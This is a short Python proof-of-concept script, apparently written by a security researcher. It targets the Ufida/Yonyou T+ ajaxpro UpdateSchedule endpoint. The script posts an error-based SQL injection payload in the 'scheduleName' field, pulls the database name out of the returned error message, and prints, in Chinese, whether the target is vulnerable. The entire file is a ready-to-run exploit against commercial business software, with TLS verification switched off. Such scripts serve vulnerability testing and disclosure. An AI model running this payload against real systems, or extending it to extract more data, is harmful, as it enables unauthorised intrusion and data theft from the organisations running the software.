#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import requests
import urllib3
import sys
import time
import json
import re
from datetime import datetime, timedelta

urllib3.disable_warnings()

def verify(site):
    burp0_url = site + "/tplus/ajaxpro/Ufida.T.SM.UIP.ScheduleManage.ScheduleManageController,Ufida.T.SM.UIP.ashx?method=UpdateSchedule"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0", "Accept-Encoding": "gzip, deflate", "Accept": "*/*"}
    burp0_json={"scheduleName": "' AND 1 IN (SELECT db_name()) AND '1'='1", "timeStr": ""}
    r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False)
    if "nvarchar" in r.text:
        patt = "'([^']+)'"

        dbname = re.findall(patt, r.json()["error"]["Message"], re.I)
        if len(dbname) != 0:
            return dbname[0]
    return ""


if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，获取数据库名称为：", info)
    else:
        print("[-]漏洞不存在") 
